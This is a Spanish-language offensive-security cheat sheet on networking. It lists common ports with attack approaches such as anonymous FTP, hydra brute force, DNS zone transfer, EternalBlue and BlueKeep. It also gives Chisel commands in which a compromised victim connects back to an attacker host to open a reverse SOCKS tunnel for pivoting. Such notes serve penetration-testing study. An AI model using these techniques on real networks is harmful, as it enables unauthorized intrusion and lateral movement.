# 🌐 Knowledge Base: Networking

Fundamentos de redes aplicados a la seguridad informática, análisis de tráfico y pivoting.

---

## 📡 Puertos y Servicios Críticos

| Puerto | Protocolo / Servicio | Vulnerabilidades y Enfoques |
| :--- | :--- | :--- |
| **21** | FTP | Acceso anónimo (`anonymous:anonymous`), versiones vulnerables (`vsftpd 2.3.4`). |
| **22** | SSH | Fuerza bruta (`hydra`), claves privadas mal protegidas (`id_rsa`). |
| **25** | SMTP | Enumeración de usuarios (`VRFY`, `EXPN`, `RCPT TO`). |
| **53** | DNS | Transferencia de zona (`dig axfr @IP dominio.com`). |
| **80 / 443** | HTTP / HTTPS | OWASP Top 10, CMS, APIs, subdominios. |
| **139 / 445** | SMB | EternalBlue (MS17-010), Shares sin autenticación (`smbclient -L //IP/ -N`). |
| **389 / 636** | LDAP | Active Directory query, autenticación anónima. |
| **3306** | MySQL | Conexión remota, inyección SQL, carga de UDFs. |
| **3389** | RDP | BlueKeep (CVE-2019-0708), fuerza bruta. |

---

## 🔀 Técnicas de Pivoting & Port Forwarding

Cuando comprometes una máquina dual-homed (con conexión a la red externa y a una red interna aislada):

### 1. Chisel (Reverse Socks Proxy)
```bash
# En tu máquina atacante:
./chisel server -p 8000 --reverse

# En la máquina víctima comprometida:
./chisel client 10.10.14.X:8000 R:socks
# Configurar /etc/proxychains4.conf con: socks5 127.0.0.1 1080
```

### 2. Ligolo-ng (Tunneling Moderno vía Interfaz TUN)
Permite crear una interfaz virtual en tu equipo para enrutar tráfico directamente sin necesidad de usar `proxychains`.
